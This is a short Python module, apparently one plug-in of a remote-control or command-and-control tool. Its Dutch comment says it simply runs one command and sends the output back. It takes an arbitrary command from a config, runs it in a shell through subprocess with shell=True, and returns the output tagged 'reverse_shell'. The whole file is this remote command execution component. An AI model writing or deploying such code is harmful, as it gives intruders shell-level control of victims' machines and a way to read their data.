import os, subprocess

def execute(config, client_id):
    # Voert simpelweg één commando uit en stuurt de output terug
    cmd = config.get("command", "whoami")
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except Exception as e:
        out = str(e)
    return {"module": "reverse_shell", "command": cmd, "output": out}